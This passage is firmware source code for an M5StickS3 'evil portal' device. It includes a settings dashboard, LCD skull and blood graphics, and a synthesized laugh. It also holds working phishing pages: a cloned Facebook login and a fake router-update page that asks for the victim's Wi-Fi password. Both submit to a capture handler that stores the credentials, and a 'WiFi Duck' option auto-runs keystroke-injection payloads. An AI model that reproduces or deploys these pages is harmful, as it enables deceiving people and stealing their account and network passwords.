    ".sec{display:flex;align-items:center;gap:8px;font-size:12px;text-transform:uppercase;letter-spacing:.6px;"
    "color:#ff8a8a;font-weight:700;margin:0 0 14px;padding:0 0 10px;border-bottom:1px solid var(--line)}"
    ".row{margin:0 0 14px}.row:last-child{margin-bottom:0}"
    "label{display:block;color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.5px;margin:0 0 6px}"
    "input[type=text],input[type=password],input[type=number],select{width:100%;padding:10px 12px;border-radius:10px;"
    "border:1px solid var(--line);background:#10131a;color:var(--txt);font-size:15px}"
    ".chk{display:flex;align-items:center;gap:10px;color:var(--txt);font-size:15px}"
    ".chk input{width:18px;height:18px;flex:none}"
    ".chk .sub{display:block;color:var(--mut);font-size:12px;text-transform:none;letter-spacing:0}"
    ".range{display:flex;align-items:center;gap:12px}.range input[type=range]{flex:1;accent-color:var(--accent)}"
    ".vv{min-width:46px;text-align:right;color:#ff8a8a;font-weight:700}"
    ".btn{display:inline-block;padding:10px 16px;border-radius:10px;border:1px solid var(--line);background:var(--card);"
    "color:var(--txt);text-decoration:none;font-size:15px;cursor:pointer}"
    ".btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}"
    ".bar{display:flex;gap:10px;margin:0 0 20px}"
    ".saved{background:rgba(48,163,108,.15);border:1px solid var(--ok);color:#8ff0c4;border-radius:10px;padding:10px 14px;margin:0 0 16px;font-size:14px}"
    ".hint{color:var(--mut);font-size:12px;margin:4px 0 0}"
    ".status{display:flex;flex-wrap:wrap;gap:10px}"
    ".scell{flex:1;min-width:120px;background:#10131a;border:1px solid var(--line);border-radius:10px;padding:10px 12px}"
    ".scell .k{color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.5px}"
    ".scell .v{font-size:17px;font-weight:700;margin-top:3px}";

  auto opt = [](int v, int cur, const char* label) -> String {
    return "<option value=\"" + String(v) + "\"" + (v == cur ? " selected" : "") + ">" + String(label) + "</option>";
  };

  // Read-only device-status figures for the panel at the bottom.
  size_t fsUsed = LittleFS.usedBytes();
  size_t fsTot  = LittleFS.totalBytes();
  String fsStr  = fsTot ? (String((unsigned long)(fsUsed / 1024)) + " / " + String((unsigned long)(fsTot / 1024)) + " KB")
                        : "n/a";

  return
    "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<title>" + attrEsc(cfgSsid) + " :: Settings</title><style>" + css + "</style></head><body>"
    "<div class=\"top\"><h1>&#9881;&#65039; Settings</h1><p>Portal Evil HUEBR &middot; M5StickS3 configuration</p></div>"
    "<div class=\"wrap\">"
    + String(saved ? "<div class=\"saved\">\xE2\x9C\x93 Settings saved.</div>" : "") +
    "<form method=\"POST\" action=\"/settings\">"

    // --- Portal ---
    "<div class=\"card\">"
    "<div class=\"sec\">&#128246; Portal</div>"
    "<div class=\"row\"><label>AP name (SSID)</label>"
    "<input type=\"text\" name=\"ssid\" maxlength=\"31\" value=\"" + attrEsc(cfgSsid) + "\">"
    "<p class=\"hint\">Changing this restarts the access point and disconnects clients.</p></div>"
    "<div class=\"row\"><label>Dashboard auto-refresh (seconds, 0 = off)</label>"
    "<input type=\"number\" name=\"refresh\" min=\"0\" max=\"120\" value=\"" + String(autoRefresh) + "\">"
    "<p class=\"hint\">How often the /admin dashboard reloads itself in the browser.</p></div>"
    "</div>"

    // --- WiFi Duck ---
    "<div class=\"card\">"
    "<div class=\"sec\">&#128038; WiFi Duck</div>"
    "<div class=\"row\"><label>Duck AP name (SSID)</label>"
    "<input type=\"text\" name=\"dssid\" maxlength=\"31\" value=\"" + attrEsc(duckSsid) + "\"></div>"
    "<div class=\"row\"><label>Duck AP password (WPA2, min 8 chars)</label>"
    "<input type=\"text\" name=\"dpass\" maxlength=\"31\" value=\"" + attrEsc(duckPass) + "\">"
    "<p class=\"hint\">Connect to this network, then open the panel to write and run DuckyScript.</p></div>"
    "<div class=\"row chk\"><input type=\"checkbox\" name=\"dauto\" " + String(duckAutorun ? "checked" : "") + ">"
    "<span>Auto-exec default payload on Duck start<span class=\"sub\">Runs the saved <code>payload</code> the instant the WiFi Duck is started.</span></span></div>"
    "</div>"

    // --- Display ---
    "<div class=\"card\">"
    "<div class=\"sec\">&#128421;&#65039; Display</div>"
    "<div class=\"row\"><label>Screen brightness</label><select name=\"bright\">"
    + opt(0, brightLevel, "1 - Low") + opt(1, brightLevel, "2 - Medium") + opt(2, brightLevel, "3 - High") +
    "</select></div>"
    "<div class=\"row chk\"><input type=\"checkbox\" name=\"flip\" " + String(screenRot == 1 ? "checked" : "") + ">"
    "<span>Flip screen 180&deg;<span class=\"sub\">For wearing/holding the device the other way up.</span></span></div>"
    "</div>"

    // --- Audio & feedback ---
    "<div class=\"card\">"
    "<div class=\"sec\">&#128266; Audio &amp; feedback</div>"
    "<div class=\"row chk\"><input type=\"checkbox\" name=\"beep\" " + String(soundOn ? "checked" : "") + ">"
    "<span>Beep on capture / boot</span></div>"
    "<div class=\"row chk\"><input type=\"checkbox\" name=\"laugh\" " + String(laughOn ? "checked" : "") + ">"
    "<span>Evil laugh on each capture<span class=\"sub\">Plays the synthesized cackle whenever a new credential is captured.</span></span></div>"
    "<div class=\"row\"><label>Speaker volume</label>"
    "<div class=\"range\"><input type=\"range\" name=\"vol\" min=\"0\" max=\"100\" value=\"" + String(spkVol) + "\" "
    "oninput=\"document.getElementById('vv').textContent=this.value+'%'\">"
    "<span id=\"vv\" class=\"vv\">" + String(spkVol) + "%</span></div>"
    "<p class=\"hint\">Keep at or below 75% on battery (M5Stack guidance for the ES8311 amp).</p></div>"
    "<div class=\"row chk\"><input type=\"checkbox\" name=\"led\" " + String(ledBlinkOn ? "checked" : "") + ">"
    "<span>LED blink on capture<span class=\"sub\">The M5StickS3 has no user LED &mdash; effective only with an external LED on LED_PIN.</span></span></div>"
    "</div>"

    // --- Security ---
    "<div class=\"card\">"
    "<div class=\"sec\">&#128272; Security</div>"
    "<div class=\"row chk\"><input type=\"checkbox\" name=\"auth\" " + String(authOn ? "checked" : "") + ">"
    "<span>Require login for this dashboard</span></div>"
    "<div class=\"row\"><label>Login user</label>"
    "<input type=\"text\" name=\"auser\" maxlength=\"31\" value=\"" + attrEsc(adminUser) + "\"></div>"
    "<div class=\"row\"><label>Login password</label>"
    "<input type=\"password\" name=\"apass\" maxlength=\"31\" value=\"" + attrEsc(adminPass) + "\">"
    "<div class=\"chk\" style=\"margin-top:8px\"><input type=\"checkbox\" "
    "onclick=\"var p=document.getElementsByName('apass')[0];p.type=this.checked?'text':'password'\">"
    "<span>Show password</span></div>"
    "<p class=\"hint\">You will be asked to log in again after changing credentials.</p></div>"
    "</div>"

    "<div class=\"bar\"><button class=\"btn primary\" type=\"submit\">&#128190; Save</button>"
    "<a class=\"btn\" href=\"/admin\">Back</a></div>"
    "</form>"

    // --- Device status (read-only) ---
    "<div class=\"card\">"
    "<div class=\"sec\">&#128202; Device status</div>"
    "<div class=\"status\">"
    "<div class=\"scell\"><div class=\"k\">Battery</div><div class=\"v\">" + String(getBatteryPct()) + "%</div></div>"
    "<div class=\"scell\"><div class=\"k\">Uptime</div><div class=\"v\">" + fmtUptime(millis()) + "</div></div>"
    "<div class=\"scell\"><div class=\"k\">Free heap</div><div class=\"v\">" + String(ESP.getFreeHeap() / 1024) + " KB</div></div>"
    "<div class=\"scell\"><div class=\"k\">Flash used</div><div class=\"v\">" + fsStr + "</div></div>"
    "<div class=\"scell\"><div class=\"k\">Captures (lifetime)</div><div class=\"v\">" + String(capcount) + "</div></div>"
    "<div class=\"scell\"><div class=\"k\">Board</div><div class=\"v\">M5StickS3</div></div>"
    "</div></div>"

    "</div></body></html>";
}

// Apply a POSTed settings form: update globals and persist. Returns true if
// the live AP needs restarting (SSID changed) -- the caller does that AFTER
// sending the response so the reply still reaches the client.
bool applySettings() {
  String newSsid = webServer.arg("ssid");
  newSsid = newSsid.substring(0, 31);
  bool ssidChanged = (newSsid.length() > 0 && newSsid != cfgSsid);
  if (newSsid.length() > 0) cfgSsid = newSsid;

  autoRefresh = (uint8_t)constrain(webServer.arg("refresh").toInt(), 0, 120);
  brightLevel = (uint8_t)constrain(webServer.arg("bright").toInt(), 0, 2);
  spkVol      = (uint8_t)constrain(webServer.arg("vol").toInt(), 0, 100);
  soundOn    = webServer.hasArg("beep");
  laughOn    = webServer.hasArg("laugh");
  ledBlinkOn = webServer.hasArg("led");
  authOn     = webServer.hasArg("auth");

  // Screen rotation: the "flip" checkbox selects 1 (flipped) vs 3 (normal).
  uint8_t newRot = webServer.hasArg("flip") ? 1 : 3;
  bool rotChanged = (newRot != screenRot);
  screenRot = newRot;

  String u = webServer.arg("auser"); u = u.substring(0, 31);
  String p = webServer.arg("apass"); p = p.substring(0, 31);
  if (u.length() > 0) adminUser = u;
  adminPass = p;

  // WiFi Duck AP settings
  String ds = webServer.arg("dssid"); ds = ds.substring(0, 31);
  String dp = webServer.arg("dpass"); dp = dp.substring(0, 31);
  if (ds.length() > 0) duckSsid = ds;
  if (dp.length() >= 8) duckPass = dp;     // keep the old one if too short for WPA2
  duckAutorun = webServer.hasArg("dauto");

  applyBrightness();
  applyVolume();
  if (rotChanged) {
    M5.Display.setRotation(screenRot);
    previous = -1;  // force a full dashboard repaint on the next loop tick
  }
  saveSettings();
  return ssidChanged && portalStarted;
}
 
String index() {
  String htmlContent = "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<style>"
    "@charset \"utf-8\";"
    "* {box-sizing: border-box;text-decoration: none;}"
    "body {display: flex;flex-direction: row;justify-content: center;align-items: center;margin-top: 40px;font-family: Helvetica, sans-serif;background: #F3F2F2;}"
    "div#corpo h1 {text-align: center;color: #4169e1;font-size: 50px;}"
    "div#login {border-radius: 6px;width: 350px;box-shadow: 0 2px 4px rgba(0 ,0 ,0 ,0.3), 0 8px 16px rgba(0 ,0 ,0 ,0.3);}"
    "div#login form {width: 100px 100px;padding: 16px;background-color: white;border-radius: 8px;}"
    "div#login a {padding-left: 80px;margin-top: 16px;display: block;}"
    "div#login p {text-align: center;font-size: 16px;margin-top: 5px;}"
    "div#login input {width: 100%;margin-bottom: 10px;padding: 16px;border-radius: 6px;border: 1px solid #c3c5c9;}"
    "div#login input[placeholder] {font-size: 16px;opacity: 50%;}"
    "div#login button {background-color: #4169e1;border-radius: 8px;border: 1px solid white;width: 100%;padding: 15px;color: white;font-family: Helvetica, sans-serif;font-size: 16px;font-weight: bold;cursor: pointer;}"
    "</style>"
    "<link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\">"
    "<title>Facebook</title>"
    "</head>"
    "<body>"
    "<div id=\"corpo\">"
    "<h1>facebook</h1>"
    "<div id=\"login\">"
    "<form name=\"login-form\" method=\"POST\" action=\"/post\">"
    "<p>Entrar no Facebook</p>"
    "<input type=\"email\" autocomplete=\"email\" name=\"email\" id=\"email\" placeholder=\"Email ou telefone\" required>"
    "<input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Senha\" required>"
    "<button type=\"submit\" name=\"submit\" id=\"submit\">Entrar</button>"
    "<a href=\"#\">Esqueceu a senha?</a>"
    "</form>"
    "</div>"
    "</div>"
    "</body>"
    "</html>";
 
  return htmlContent;
}

// Victim-facing page for EVIL TWIN mode: looks like a router security/firmware
// update that needs the Wi-Fi password to "reconnect". The cloned network name
// is shown prominently to build trust. Submits to /post (same capture path, so
// the evil laugh fires on capture); the hidden field tags it as a Wi-Fi key.
String twinIndex() {
  String net = attrEsc(twinSSID);
  return
    "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<title>Atualiza&ccedil;&atilde;o do Roteador</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif}"
    "body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,#eaf1fb,#d7e3f5);color:#1c2733;padding:18px}"
    ".card{background:#fff;width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 12px 34px rgba(20,50,90,.18)}"
    ".top{background:linear-gradient(135deg,#17508f,#2f74c0);color:#fff;padding:22px 24px;text-align:center}"
    ".top .ico{width:54px;height:54px;margin:0 auto 10px;display:block}"
    ".top h1{font-size:18px;font-weight:700}"
    ".top p{font-size:12.5px;opacity:.9;margin-top:4px}"
    ".bd{padding:22px 24px}"
    ".net{display:flex;align-items:center;gap:10px;background:#f1f6fd;border:1px solid #d9e6f6;border-radius:10px;padding:11px 13px;margin-bottom:16px}"
    ".net .k{font-size:11px;color:#6b7a8c;text-transform:uppercase;letter-spacing:.5px}"
    ".net .v{font-size:15px;font-weight:700;color:#17508f;word-break:break-all}"
    ".note{font-size:13.5px;color:#55616e;line-height:1.5;margin-bottom:18px}"
    "label{display:block;font-size:12.5px;color:#55616e;margin-bottom:6px;font-weight:600}"
    "input{width:100%;padding:14px;border-radius:9px;border:1px solid #c6d2e0;font-size:16px;margin-bottom:16px}"
    "input:focus{outline:none;border-color:#2f74c0;box-shadow:0 0 0 3px rgba(47,116,192,.15)}"
    "button{width:100%;padding:14px;border:0;border-radius:9px;background:#17508f;color:#fff;font-size:15px;font-weight:700;cursor:pointer}"
    "button:hover{background:#123f70}"
    ".sec{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:14px;font-size:11.5px;color:#8a97a5}"
    "</style></head><body>"
    "<div class=\"card\">"
    "<div class=\"top\">"
    "<svg class=\"ico\" viewBox=\"0 0 64 64\" fill=\"none\">"
    "<rect x=\"8\" y=\"34\" width=\"48\" height=\"20\" rx=\"4\" fill=\"#fff\" opacity=\".92\"/>"
    "<circle cx=\"18\" cy=\"44\" r=\"2.6\" fill=\"#2f74c0\"/>"
    "<rect x=\"40\" y=\"42\" width=\"10\" height=\"4\" rx=\"2\" fill=\"#2f74c0\"/>"
    "<path d=\"M20 26a17 17 0 0 1 24 0\" stroke=\"#fff\" stroke-width=\"4\" stroke-linecap=\"round\"/>"
    "<path d=\"M26 31a9 9 0 0 1 12 0\" stroke=\"#fff\" stroke-width=\"4\" stroke-linecap=\"round\"/>"
    "<circle cx=\"32\" cy=\"35\" r=\"2.4\" fill=\"#fff\"/></svg>"
    "<h1>Atualiza&ccedil;&atilde;o de Seguran&ccedil;a</h1>"
    "<p>Seu roteador instalou uma atualiza&ccedil;&atilde;o</p>"
    "</div>"
    "<div class=\"bd\">"
    "<div class=\"net\">"
    "<svg width=\"22\" height=\"22\" viewBox=\"0 0 24 24\" fill=\"none\">"
    "<path d=\"M4 9a13 13 0 0 1 16 0\" stroke=\"#2f74c0\" stroke-width=\"2\" stroke-linecap=\"round\"/>"
    "<path d=\"M7.5 12.5a8 8 0 0 1 9 0\" stroke=\"#2f74c0\" stroke-width=\"2\" stroke-linecap=\"round\"/>"
    "<circle cx=\"12\" cy=\"16.5\" r=\"1.8\" fill=\"#2f74c0\"/></svg>"
    "<div><div class=\"k\">Rede Wi-Fi</div><div class=\"v\">" + net + "</div></div>"
    "</div>"
    "<p class=\"note\">Para concluir a atualiza&ccedil;&atilde;o e restaurar a conex&atilde;o, "
    "confirme a senha da sua rede Wi-Fi <b>" + net + "</b>.</p>"
    "<form method=\"POST\" action=\"/post\">"
    "<input type=\"hidden\" name=\"email\" value=\"Wi-Fi: " + net + "\">"
    "<label>Senha da rede Wi-Fi</label>"
    "<input type=\"password\" name=\"password\" placeholder=\"Digite a senha da rede\" required autofocus>"
    "<button type=\"submit\">Reconectar</button>"
    "</form>"
    "<div class=\"sec\">&#128274; Conex&atilde;o segura &middot; Gateway</div>"
    "</div></div></body></html>";
}

// Standalone "please wait / validating" page shown after a submission.
// Pure CSS/JS (device is offline): animated Wi-Fi icon, indeterminate progress
// bar, spinner and a live countdown. Text comes from POST_TITLE / POST_BODY.
String waiting() {
  return
    "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<title>" + String(POST_TITLE) + "</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,#eef3fb,#dce7f7);font-family:Helvetica,Arial,sans-serif;color:#1c1e21;padding:20px}"
    ".card{background:#fff;width:100%;max-width:380px;border-radius:18px;padding:34px 28px;text-align:center;box-shadow:0 10px 30px rgba(24,119,242,.15),0 2px 8px rgba(0,0,0,.06)}"
    ".wifi{width:76px;height:76px;margin:0 auto 18px}"
    ".wifi svg{width:100%;height:100%}"
    ".a{fill:none;stroke:#1877f2;stroke-width:6;stroke-linecap:round;opacity:.2;animation:pulse 1.8s infinite}"
    ".a2{animation-delay:.2s}.a3{animation-delay:.4s}"
    ".dot{fill:#1877f2}"
    "@keyframes pulse{0%,100%{opacity:.2}40%{opacity:1}}"
    "h1{font-size:22px;color:#1877f2;margin-bottom:10px;font-weight:700}"
    ".msg{font-size:15px;color:#606770;line-height:1.5;margin-bottom:22px}"
    ".track{height:8px;background:#e8edf3;border-radius:99px;overflow:hidden;margin-bottom:18px}"
    ".track i{display:block;height:100%;width:40%;border-radius:99px;background:linear-gradient(90deg,#1877f2,#4fa3ff);animation:slide 1.4s ease-in-out infinite}"
    "@keyframes slide{0%{margin-left:-45%}100%{margin-left:105%}}"
    ".status{display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;color:#8a8d91}"
    ".spin{width:14px;height:14px;border:2px solid #cdd3dc;border-top-color:#1877f2;border-radius:50%;animation:spin .8s linear infinite}"
    "@keyframes spin{to{transform:rotate(360deg)}}"
    ".foot{margin-top:20px;font-size:12px;color:#b0b3b8}"
    "@media(prefers-reduced-motion){.a,.track i,.spin{animation:none}.a{opacity:.75}}"
    "</style></head><body>"
    "<div class=\"card\">"
    "<div class=\"wifi\"><svg viewBox=\"0 0 100 100\">"
    "<path class=\"a a3\" d=\"M15,45 A48,48 0 0 1 85,45\"/>"
    "<path class=\"a a2\" d=\"M27,56 A33,33 0 0 1 73,56\"/>"
    "<path class=\"a\" d=\"M38,66 A19,19 0 0 1 62,66\"/>"
    "<circle class=\"dot\" cx=\"50\" cy=\"74\" r=\"5\"/>"
    "</svg></div>"
    "<h1>" + String(POST_TITLE) + "</h1>"
    "<p class=\"msg\">" + String(POST_BODY) + "</p>"
    "<div class=\"track\"><i></i></div>"
    "<div class=\"status\"><span class=\"spin\"></span>Tempo estimado: <span id=\"t\">5:00</span></div>"
    "<div class=\"foot\">&#128274; Conex&atilde;o segura</div>"
    "</div>"
    "<script>var s=300,el=document.getElementById('t');setInterval(function(){if(s>0)s--;var m=(s/60)|0,x=s%60;el.textContent=m+':'+(x<10?'0'+x:x);},1000);</script>"
    "</body></html>";
}

String posted() {
  addCapture(input("email"), input("password"));
  return waiting();
}

String clear() {
  clearCaptures(false);  // wipe stored entries; keep the lifetime counter
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/admin>Back to dashboard</a></center>" + footer();
}
 
// Arm a non-blocking blink: 5 on/off cycles = 10 toggles.
// The toggling itself happens in updateBlink() from loop(), so DNS/HTTP keep serving.
void startBlink() {
  blinkRemaining = 10;
  lastBlink = millis();
  ledWrite(true); // LED on (no-op when LED_PIN < 0)
}

void updateBlink() {
  if (blinkRemaining > 0 && (millis() - lastBlink) > BLINK_INTERVAL) {
    lastBlink = millis();
    blinkRemaining--;
    // even remaining -> LED off, odd -> LED on
    ledWrite(blinkRemaining % 2 != 0);
    if (blinkRemaining == 0) ledWrite(false); // make sure it ends off
  }
}

// -------- LCD UI (240x135, rotation 3) --------

// Small "AP active" dot in the top-right of the header bar.
void drawStatusDot(bool on) {
  M5.Lcd.fillCircle(228, 13, 5, on ? C_OK : C_OKDIM);
}

// Battery charge (0-100%). The M5StickS3 has no AXP192; the M5PM1 PMU reports
// the level directly through M5Unified's Power class. Returns -1 when unknown
// (e.g. before the PMU is ready) -- clamp that to 0.
int getBatteryPct() {
  int pct = M5.Power.getBatteryLevel();
  if (pct > 100) pct = 100;
  if (pct < 0) pct = 0;
  return pct;
}

// Battery gauge: a cell-shaped icon (body + nub) whose fill tracks the charge
// level, with the percentage printed to its left. The outline/text use
// `fg` and the surrounding area is cleared with `bg` so it can sit on the
// dark body (dashboard) or on the blue header bar (menus).
void drawBatteryAt(int bx, int by, uint16_t fg, uint16_t bg) {
  int pct = getBatteryPct();
  const int bw = 26, bh = 13;
  uint16_t col = (pct > 50) ? C_OK : (pct > 20 ? C_COUNT : C_DANGER);

  // Clear the gauge area (percentage width changes with the digit count).
  M5.Lcd.fillRect(bx - 40, by - 2, 40 + bw + 6, bh + 5, bg);

  // Cell body, terminal nub, and proportional fill.
  M5.Lcd.drawRoundRect(bx, by, bw, bh, 2, fg);
  M5.Lcd.fillRect(bx + bw, by + 4, 3, bh - 8, fg);
  int fw = (bw - 4) * pct / 100;
  M5.Lcd.fillRect(bx + 2, by + 2, fw, bh - 4, col);

  // Percentage to the left of the icon.
  M5.Lcd.setTextDatum(MR_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(fg, bg);
  M5.Lcd.drawString(String(pct) + "%", bx - 5, by + bh / 2);
}

// Dashboard battery gauge (top-right of the SSID row, on the dark body).
void drawBattery() {
  drawBatteryAt(208, 38, C_MUTED, C_BG);
}

// A shaded bone blob: a deep-shadow rim, a shadow body offset down-right, the
// main bone on top, and a soft highlight up-left -> reads as a 3D form.
void boneBlob(int x, int y, int rx, int ry) {
  M5.Lcd.fillEllipse(x + 1, y + 2, rx + 1, ry + 1, C_BONE_SH2);  // outline/rim
  M5.Lcd.fillEllipse(x + 2, y + 3, rx, ry, C_BONE_SH);           // shadow
  M5.Lcd.fillEllipse(x, y, rx, ry, C_BONE);                      // main bone
  M5.Lcd.fillEllipse(x - rx / 3, y - ry / 3, rx / 3, ry / 4, C_BONE_HI); // highlight
}

// Smooth, vector-drawn skull built from basic forms (reference method: a
// dominant cranium "sphere", a separate horseshoe jaw, almond eye sockets set
// as 3D pits, a heart nasal cavity, and teeth). The jaw is a movable piece, so
// dropping it a few pixels makes the skull laugh.
// (cx, cy) is the cranium centre. `open` drops the jaw; `eyeCol` pulses the eyes.
void drawSkull(int cx, int cy, bool open, uint16_t eyeCol) {
  int jawDrop = open ? 7 : 0;

  // --- Lower jaw (mandible) -- drawn first so the cranium overlaps its top ---
  int jawTop = cy + 12 + jawDrop;
  M5.Lcd.fillRoundRect(cx - 23, jawTop + 2, 46, 30, 12, C_BONE_SH2);
  M5.Lcd.fillRoundRect(cx - 24, jawTop + 1, 46, 30, 12, C_BONE_SH);
  M5.Lcd.fillRoundRect(cx - 24, jawTop,     46, 28, 12, C_BONE);

  // --- Cranium (dominant shaded sphere) + cheekbones ---
  boneBlob(cx, cy, 41, 35);

  // --- Eye sockets: almond-shaped 3D pits, slightly below centre ---
  int ex = 18, ey = cy - 1;
  // soft shadow seat under each socket for depth
  M5.Lcd.fillEllipse(cx - ex, ey + 2, 14, 15, C_BONE_SH);
  M5.Lcd.fillEllipse(cx + ex, ey + 2, 14, 15, C_BONE_SH);
  M5.Lcd.fillEllipse(cx - ex, ey, 12, 13, C_SOCKET);
  M5.Lcd.fillEllipse(cx + ex, ey, 12, 13, C_SOCKET);
  // angled inner-top brow -> gives the skull a bit of attitude
  M5.Lcd.fillTriangle(cx - 4, cy - 15, cx - 4, cy - 2, cx - 11, cy - 12, C_BONE);
  M5.Lcd.fillTriangle(cx + 4, cy - 15, cx + 4, cy - 2, cx + 11, cy - 12, C_BONE);
  // glowing eyes + dark pupils
  M5.Lcd.fillEllipse(cx - ex, ey + 2, 7, 8, eyeCol);
  M5.Lcd.fillEllipse(cx + ex, ey + 2, 7, 8, eyeCol);
  M5.Lcd.fillCircle(cx - ex, ey + 3, 2, C_SOCKET);
  M5.Lcd.fillCircle(cx + ex, ey + 3, 2, C_SOCKET);

  // --- Nasal cavity: heart / inverted triangle ---
  int ny = cy + 9;
  M5.Lcd.fillTriangle(cx - 6, ny, cx + 6, ny, cx, ny + 13, C_SOCKET);
  M5.Lcd.fillCircle(cx - 3, ny + 1, 3, C_SOCKET);
  M5.Lcd.fillCircle(cx + 3, ny + 1, 3, C_SOCKET);

  // --- Teeth / mouth (over the cranium-jaw junction) ---
  const int mw = 40, mx = cx - mw / 2;
  int upperY = cy + 23;
  M5.Lcd.fillRoundRect(mx, upperY, mw, 8, 2, C_BONE);          // upper teeth strip
  for (int tx = mx + 6; tx < mx + mw; tx += 6)
    M5.Lcd.drawFastVLine(tx, upperY, 8, C_BONE_SH2);           // tooth gaps

  if (open) {
    M5.Lcd.fillRect(mx + 2, upperY + 8, mw - 4, 7 + jawDrop, C_SOCKET);  // open mouth
    int lowerY = upperY + 15 + jawDrop;
    M5.Lcd.fillRoundRect(mx + 4, lowerY, mw - 8, 7, 2, C_BONE);          // lower teeth
    for (int tx = mx + 10; tx < mx + mw - 4; tx += 6)
      M5.Lcd.drawFastVLine(tx, lowerY, 7, C_BONE_SH2);
  } else {
    int lowerY = upperY + 8;
    M5.Lcd.fillRoundRect(mx + 2, lowerY, mw - 4, 7, 2, C_BONE);          // lower teeth
    M5.Lcd.drawFastHLine(mx + 2, upperY + 8, mw - 4, C_BONE_SH2);        // bite line
    for (int tx = mx + 6; tx < mx + mw - 2; tx += 6)
      M5.Lcd.drawFastVLine(tx, lowerY, 7, C_BONE_SH2);
  }
}

// -------- Evil laugh (synthesized, played through the S3 speaker) --------
// The M5StickC Plus only had a buzzer, so the boot used two square-wave beeps.
// The M5StickS3 has a real speaker (ES8311), so we synthesize a short voiced
// "ha-ha-ha" cackle as 16-bit PCM and play it via M5.Speaker.playRaw(). The
// buffer is generated once and kept for the program's lifetime (playRaw streams
// from it asynchronously, so it must stay valid for the whole playback).
#define LAUGH_SR 16000
static int16_t* laughBuf = nullptr;
static size_t   laughLen = 0;

void buildLaugh() {
  if (laughBuf) return;                        // build once
  const int   NSYL   = 7;                      // number of "ha" syllables
  const float sylDur = 0.16f;                  // voiced part of each (s)
  const float gapDur = 0.06f;                  // silence between (s)
  const float startF = 300.0f, endF = 165.0f;  // descending pitch -> evil cackle
  size_t cap = (size_t)(LAUGH_SR * NSYL * (sylDur + gapDur)) + 8;
  laughBuf = (int16_t*) ps_malloc(cap * sizeof(int16_t));   // prefer PSRAM
  if (!laughBuf) laughBuf = (int16_t*) malloc(cap * sizeof(int16_t));
  if (!laughBuf) { laughLen = 0; return; }     // no RAM: caller falls back to beeps

  size_t idx = 0;
  uint32_t rng = 0x1234abcd;
  size_t sylN = (size_t)(LAUGH_SR * sylDur);
  size_t gapN = (size_t)(LAUGH_SR * gapDur);
  for (int s = 0; s < NSYL; s++) {
    float f0 = startF + (endF - startF) * (s / (float)(NSYL - 1));
    double ph1 = 0, ph2 = 0, ph3 = 0;
    for (size_t n = 0; n < sylN && idx < cap; n++, idx++) {
      float t   = n / (float)sylN;                                // 0..1 within the syllable
      float env = expf(-4.2f * t) * (t < 0.03f ? t / 0.03f : 1);  // fast attack + decay = a "ha" pulse
      float vib = 1.0f + 0.02f * sinf(2 * PI * 6.0f * n / LAUGH_SR);
      float ff  = f0 * (1.0f - 0.12f * t) * vib;                  // downward glide + light vibrato
      ph1 += 2 * PI * ff        / LAUGH_SR;
      ph2 += 2 * PI * ff * 2.0f / LAUGH_SR;
      ph3 += 2 * PI * ff * 3.0f / LAUGH_SR;
      float voiced = (sinf(ph1) + 0.5f * sinf(ph2) + 0.25f * sinf(ph3)) / 1.75f;  // 3 harmonics
      rng = rng * 1664525u + 1013904223u;
      float noise = ((int32_t)(rng >> 16) - 32768) / 32768.0f;    // breath
      int v = (int)(env * (0.9f * voiced + 0.1f * noise) * 9000.0f);
      if (v > 32767) v = 32767; else if (v < -32768) v = -32768;
      laughBuf[idx] = (int16_t)v;
    }
    for (size_t n = 0; n < gapN && idx < cap; n++, idx++) laughBuf[idx] = 0;
  }
  laughLen = idx;
}

// Play the evil laugh once (used on each capture). Lazily builds the PCM buffer
// if needed; falls back to a short beep if it couldn't be allocated.
void playLaugh() {
  buildLaugh();
  if (laughBuf && laughLen) M5.Speaker.playRaw(laughBuf, laughLen, LAUGH_SR, false, 1);
  else M5.Speaker.tone(4000, 60);
}

// -------- Horror / blood visuals --------

// A single blood drip hanging from (x, top) running down `len` px: a wet column
// with a rounded bead at the tip, shaded left (dark) and right (glint).
void drawBloodDrip(int x, int top, int len) {
  if (len < 1) return;
  M5.Lcd.fillRect(x - 1, top, 3, len, C_BLOOD);          // column
  M5.Lcd.drawFastVLine(x - 2, top, len, C_BLOOD_DK);     // left shadow
  M5.Lcd.drawFastVLine(x + 1, top, len, C_BLOOD_HI);     // wet right edge
  M5.Lcd.fillCircle(x, top + len, 2, C_BLOOD);           // bead at the tip
  M5.Lcd.drawPixel(x - 1, top + len - 1, C_BLOOD_HI);    // glint
}

// Blood oozing from the header line and running down the screen's side margins.
// The drips stay in the left/right margins so they never cover menu content.
// `p` (0..1) is the drip-length fraction, so the frame can animate in.
void drawBloodFrameP(float p) {
  if (p < 0) p = 0; if (p > 1) p = 1;
  M5.Lcd.drawFastHLine(0, 26, 240, C_BLOOD_DK);
  M5.Lcd.drawFastHLine(0, 27, 240, C_BLOOD);
  drawBloodDrip(2,   28, (int)(66 * p));
  drawBloodDrip(5,   28, (int)(30 * p));
